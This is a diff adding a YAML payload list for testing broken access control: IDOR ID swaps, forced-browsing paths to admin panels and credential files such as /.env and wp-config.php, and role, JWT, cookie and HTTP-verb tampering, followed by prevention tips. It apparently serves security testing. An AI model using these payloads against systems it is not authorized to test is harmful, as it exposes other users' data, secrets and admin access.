@@ -1,0 +1,163 @@
+# A01:2025 - Broken Access Control - IDOR & Privilege Escalation Payloads
+# CWE-639: Authorization Bypass Through User-Controlled Key
+
+payload_category: "access-control"
+owasp_2025: "A01"
+cwe: "CWE-639"
+severity: "HIGH"
+
+# ===== IDOR (Insecure Direct Object Reference) =====
+idor:
+  sequential_ids:
+    integers:
+      - "1"
+      - "2"
+      - "3"
+      - "0"
+      - "-1"
+      - "99999"
+      - "100"
+      - "1000"
+    
+    descriptions:
+      - "Replace current user ID with other user IDs"
+      - "Try ID=0 or ID=-1 for admin/system records"
+      - "Try very large IDs for hidden records"
+
+  uuid_manipulation:
+    - "00000000-0000-0000-0000-000000000000"
+    - "Replace UUID with another user's UUID"
+    - "Enumerate UUIDs from other API responses"
+
+  encoded_ids:
+    base64:
+      - "Decode base64 ID, modify, re-encode"
+      - "Change user_id value in decoded payload"
+    hash:
+      - "If ID is MD5/SHA1 of username, generate for other users"
+      - "md5(admin), md5(user1), md5(test)"
+
+  api_endpoints:
+    - "/api/users/1 → /api/users/2"
+    - "/api/orders/100 → /api/orders/101"
+    - "/api/invoices/50 → /api/invoices/51"
+    - "/api/profile/me → /api/profile/1"
+    - "/api/documents/abc → /api/documents/def"
+    - "/api/v1/users/{id}/settings"
+    - "/api/v1/admin/users (as regular user)"
+
+  http_methods:
+    - "GET /api/users/2 (view other user)"
+    - "PUT /api/users/2 (modify other user)"
+    - "DELETE /api/users/2 (delete other user)"
+    - "PATCH /api/users/2 (partial modify)"
+
+  body_parameters:
+    - "{\"user_id\": 2}"
+    - "{\"owner_id\": 1}"
+    - "{\"account_id\": \"other_account\"}"
+    - "{\"email\": \"victim@example.com\"}"
+
+# ===== FORCED BROWSING =====
+forced_browsing:
+  admin_panels:
+    - "/admin"
+    - "/admin/"
+    - "/administrator"
+    - "/admin/dashboard"
+    - "/admin/login"
+    - "/management"
+    - "/console"
+    - "/panel"
+    - "/_admin"
+    - "/wp-admin"
+    - "/phpmyadmin"
+    - "/adminer"
+
+  sensitive_paths:
+    - "/.env"
+    - "/config.php"
+    - "/wp-config.php"
+    - "/web.config"
+    - "/.git/config"
+    - "/.git/HEAD"
+    - "/.svn/entries"
+    - "/backup.sql"
+    - "/database.sql"
+    - "/debug"
+    - "/trace"
+    - "/actuator"
+    - "/actuator/env"
+    - "/actuator/health"
+    - "/swagger-ui.html"
+    - "/api-docs"
+
+  api_discovery:
+    - "/api/v1/"
+    - "/api/v2/"
+    - "/api/internal/"
+    - "/api/admin/"
+    - "/api/debug/"
+    - "/graphql"
+    - "/graphiql"
+
+# ===== PRIVILEGE ESCALATION =====
+privilege_escalation:
+  role_manipulation:
+    - "{\"role\": \"admin\"}"
+    - "{\"role\": \"administrator\"}"
+    - "{\"is_admin\": true}"
+    - "{\"admin\": 1}"
+    - "{\"access_level\": 999}"
+    - "{\"permissions\": [\"admin\",\"read\",\"write\",\"delete\"]}"
+    - "{\"group\": \"administrators\"}"
+
+  parameter_tampering:
+    - "Add role=admin to registration request"
+    - "Modify user_type in profile update"
+    - "Change is_staff=true in cookie/JWT"
+    - "Add admin=1 to query parameters"
+
+  jwt_claims:
+    - "Modify 'role' claim to 'admin'"
+    - "Change 'sub' claim to admin user ID"
+    - "Add 'admin: true' to payload"
+    - "Change 'groups' to include 'administrators'"
+
+  cookie_manipulation:
+    - "isAdmin=true"
+    - "role=admin"
+    - "user_type=administrator"
+    - "access_level=99"
+
+# ===== HORIZONTAL PRIVILEGE ESCALATION =====
+horizontal_escalation:
+  techniques:
+    - "Change user_id in API requests"
+    - "Swap session tokens between users"
+    - "Modify email parameter to access other accounts"
+    - "Change account_number in financial operations"
+
+# ===== VERB TAMPERING =====
+verb_tampering:
+  - "OPTIONS /admin (bypass GET restriction)"
+  - "HEAD /admin (bypass POST-only)"
+  - "PUT /admin (bypass GET/POST filter)"
+  - "TRACE /admin (method-based bypass)"
+  - "PATCH /restricted-resource"
+
+prevention:
+  - "Implement proper authorization checks on every request"
+  - "Use indirect object references (map to user-specific data)"
+  - "Validate user ownership of requested resources"
+  - "Deny by default access control"
+  - "Log and alert on access control failures"
+  - "Rate limit API access"
+  - "Use UUIDs instead of sequential IDs"
+
+references:
+  - "OWASP Top 10:2025 A01"
+  - "CWE-639: IDOR"
+  - "CWE-862: Missing Authorization"
+  - "CWE-863: Incorrect Authorization"
+  - "PortSwigger: Access Control Vulnerabilities"
